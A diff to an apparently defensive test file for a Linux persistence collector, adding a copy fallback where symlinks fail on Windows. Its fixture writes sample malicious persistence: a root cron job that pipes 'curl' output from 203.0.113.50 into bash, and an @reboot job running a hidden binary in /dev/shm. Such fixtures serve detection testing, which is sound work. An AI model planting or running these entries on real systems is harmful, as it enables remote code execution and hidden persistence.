@@ -4,6 +4,7 @@
 """Linux persistence collector on a SIMULATED file system tree."""
 
 import os
+import shutil
 
 import pytest
 
@@ -29,7 +30,12 @@ def root(tmp_path):
     w("usr/lib/systemd/system/ssh.service", "[Service]\nExecStart=-/usr/sbin/sshd -D\n")
     wants = tmp_path / "etc/systemd/system/multi-user.target.wants"
     wants.mkdir(parents=True)
-    os.symlink("/usr/lib/systemd/system/ssh.service", wants / "ssh.service")
+    try:
+        os.symlink("/usr/lib/systemd/system/ssh.service", wants / "ssh.service")
+    except OSError:
+        # Windows allows symlinks only with a special privilege; a plain copy
+        # still tests that enabled units under *.wants are read.
+        shutil.copy(tmp_path / "usr/lib/systemd/system/ssh.service", wants / "ssh.service")
     w("etc/crontab", "SHELL=/bin/sh\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
     w("etc/cron.d/updater", "*/5 * * * * root curl -fsSL http://203.0.113.50/u.sh | bash\n")
     w("var/spool/cron/crontabs/deploy", "@reboot /dev/shm/.x/agent\n")
